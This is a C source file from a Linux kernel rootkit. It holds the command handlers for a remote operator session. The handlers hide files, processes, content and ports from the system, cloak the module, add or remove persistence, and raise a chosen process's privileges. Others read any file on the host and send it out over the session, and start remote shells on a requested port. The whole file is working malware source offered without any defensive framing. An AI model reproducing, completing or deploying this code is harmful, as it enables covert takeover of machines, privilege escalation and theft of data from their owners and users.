// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include "rootkit.h"

int cmd_ping(struct rk_session *s, const char *arg)
{
	return rk_send_response(s, "OK");
}

int cmd_status(struct rk_session *s, const char *arg)
{
	char buf[256];
	int hidden, persisted;

	hidden = (rk_file_targets.count > 0 || rk_pid_targets.count > 0 ||
		  rk_content_targets.count > 0 || rk_port_targets.count > 0);
	persisted = rk_is_persisted();

	snprintf(buf, sizeof(buf),
		 "STATUS hidden=%s persisted=%s files=%d pids=%d content=%d ports=%d",
		 hidden ? "yes" : "no",
		 persisted ? "yes" : "no",
		 rk_file_targets.count, rk_pid_targets.count,
		 rk_content_targets.count, rk_port_targets.count);
	return rk_send_response(s, buf);
}

int cmd_info(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf), "INFO %s %s %s",
		 utsname()->nodename, utsname()->release, utsname()->machine);
	return rk_send_response(s, buf);
}

static int do_hide(struct rk_session *s, struct rk_target_list *list,
		   const char *arg)
{
	int ret;
	char resp[32];

	if (!arg || !*arg)
		return rk_send_response(s, "ERR 6");
	ret = rk_target_add(list, arg);
	if (ret)
		return rk_send_response(s, "ERR 1");
	snprintf(resp, sizeof(resp), "OK %d", list->count - 1);
	return rk_send_response(s, resp);
}

int cmd_hide_file(struct rk_session *s, const char *arg)
{
	return do_hide(s, &rk_file_targets, arg);
}

int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return do_hide(s, &rk_pid_targets, arg);
}

int cmd_hide_content(struct rk_session *s, const char *arg)
{
	return do_hide(s, &rk_content_targets, arg);
}

int cmd_hide_port(struct rk_session *s, const char *arg)
{
	return do_hide(s, &rk_port_targets, arg);
}

static int do_unhide(struct rk_session *s, struct rk_target_list *list,
		     const char *arg)
{
	int idx, ret;
	char removed[RK_NAME_MAX];
	char resp[RK_NAME_MAX + 8];
	unsigned long flags;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR 2");

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		spin_unlock_irqrestore(&list->lock, flags);
		return rk_send_response(s, "ERR 2");
	}
	strscpy(removed, list->targets[idx], RK_NAME_MAX);
	spin_unlock_irqrestore(&list->lock, flags);

	ret = rk_target_remove(list, idx);
	if (ret)
		return rk_send_response(s, "ERR 2");

	snprintf(resp, sizeof(resp), "OK %s", removed);
	return rk_send_response(s, resp);
}

int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	return do_unhide(s, &rk_file_targets, arg);
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return do_unhide(s, &rk_pid_targets, arg);
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return do_unhide(s, &rk_content_targets, arg);
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return do_unhide(s, &rk_port_targets, arg);
}

int cmd_hide_module(struct rk_session *s, const char *arg)
{
	rk_cloak();
	return rk_send_response(s, "OK");
}

int cmd_unhide_module(struct rk_session *s, const char *arg)
{
	rk_uncloak();
	return rk_send_response(s, "OK");
}

int cmd_unhide_all(struct rk_session *s, const char *arg)
{
	rk_file_targets.count = 0;
	rk_pid_targets.count = 0;
	rk_content_targets.count = 0;
	rk_port_targets.count = 0;
	return rk_send_response(s, "OK");
}

int cmd_list(struct rk_session *s, const char *arg)
{
	struct rk_target_list *list = NULL;
	const char *rest = NULL;
	char *space;
	char category[16];
	unsigned long flags;
	size_t cat_len;

	if (!arg)
		return rk_send_response(s, "ERR 6");

	space = strchr(arg, ' ');
	if (space) {
		cat_len = space - arg;
		if (cat_len >= sizeof(category))
			return rk_send_response(s, "ERR 6");
		memcpy(category, arg, cat_len);
		category[cat_len] = '\0';
		rest = space + 1;
	} else {
		strscpy(category, arg, sizeof(category));
	}

	if (strcmp(category, "FILE") == 0)
		list = &rk_file_targets;
	else if (strcmp(category, "PID") == 0)
		list = &rk_pid_targets;
	else if (strcmp(category, "CONTENT") == 0)
		list = &rk_content_targets;
	else if (strcmp(category, "PORT") == 0)
		list = &rk_port_targets;
	else
		return rk_send_response(s, "ERR 6");

	if (rest && *rest) {
		int idx;
		char resp[RK_NAME_MAX + 16];

		if (kstrtoint(rest, 10, &idx) != 0)
			return rk_send_response(s, "ERR 2");

		spin_lock_irqsave(&list->lock, flags);
		if (idx < 0 || idx >= list->count) {
			spin_unlock_irqrestore(&list->lock, flags);
			return rk_send_response(s, "ERR 2");
		}
		snprintf(resp, sizeof(resp), "ENTRY %d %s",
			 idx, list->targets[idx]);
		spin_unlock_irqrestore(&list->lock, flags);
		return rk_send_response(s, resp);
	}

	{
		char resp[16];

		spin_lock_irqsave(&list->lock, flags);
		snprintf(resp, sizeof(resp), "LIST %d", list->count);
		spin_unlock_irqrestore(&list->lock, flags);
		return rk_send_response(s, resp);
	}
}

int cmd_persist(struct rk_session *s, const char *arg)
{
	int ret = rk_persist();

	return rk_send_response(s, ret ? "ERR 6" : "OK");
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	int ret = rk_unpersist();

	return rk_send_response(s, ret ? "ERR 6" : "OK");
}

int cmd_escalate(struct rk_session *s, const char *arg)
{
	int pid;

	if (!arg || kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return rk_send_response(s, "ERR 6");
	return rk_send_response(s, rk_escalate_pid(pid) ? "ERR 6" : "OK");
}

int cmd_download(struct rk_session *s, const char *arg)
{
	struct file *f;
	char *buf;
	loff_t pos = 0;
	loff_t size;
	char header[32];
	int error;

	if (!arg || !*arg)
		return rk_send_response(s, "ERR 3");

	f = filp_open(arg, O_RDONLY, 0);
	if (IS_ERR(f))
		return rk_send_response(s, "ERR 3");

	size = i_size_read(file_inode(f));
	snprintf(header, sizeof(header), "FILE %lld", size);
	error = rk_send_response(s, header);
	if (error)
		goto out_close;

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		error = -ENOMEM;
		goto out_close;
	}

	for (;;) {
		ssize_t bytes_read;

		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
		if (bytes_read < 0) {
			error = (int)bytes_read;
			break;
		}
		if (bytes_read == 0)
			break;

		error = rk_send_sealed(s, (u8 *)buf, bytes_read);
		if (error)
			break;
	}

	if (!error)
		error = rk_send_response(s, "EOF");

	kfree(buf);
out_close:
	filp_close(f, NULL);
	return error;
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	unsigned short port;
	u32 request_id;
	u64 cookie;
	char resp[48];
	int ret;

	if (!arg || kstrtou16(arg, 10, &port) != 0 || !port)
		return rk_send_response(s, "ERR 5");

	get_random_bytes(&request_id, sizeof(request_id));
	get_random_bytes(&cookie, sizeof(cookie));
	if (!request_id)
		request_id = 1;
	if (!cookie)
		cookie = 1;

	snprintf(resp, sizeof(resp), "OPEN %08x %016llx",
		 request_id, (unsigned long long)cookie);
	ret = rk_send_response(s, resp);
	if (ret)
		return ret;

	ret = rk_start_shell(port, request_id, cookie);
	if (ret)
		return ret;

	return 0;
}

int cmd_shell_status(struct rk_session *s, const char *arg)
{
	char resp[48];

	rk_shell_status(resp, sizeof(resp));
	return rk_send_response(s, resp);
}

int cmd_exec_shell(struct rk_session *s, const char *arg)
{
	unsigned short port;
	u32 request_id;
	u64 cookie;
	char resp[48];
	int ret;

	if (!arg || kstrtou16(arg, 10, &port) != 0 || !port)
		return rk_send_response(s, "ERR 5");

	get_random_bytes(&request_id, sizeof(request_id));
	get_random_bytes(&cookie, sizeof(cookie));
	if (!request_id)
		request_id = 1;
	if (!cookie)
		cookie = 1;

	snprintf(resp, sizeof(resp), "OPEN %08x %016llx",
		 request_id, (unsigned long long)cookie);
	ret = rk_send_response(s, resp);
	if (ret)
		return ret;

	ret = rk_start_exec_shell(port, request_id, cookie);
	if (ret)
		return ret;

	return 0;
}

int cmd_quit(struct rk_session *s, const char *arg)
{
	return -ECONNRESET;
}
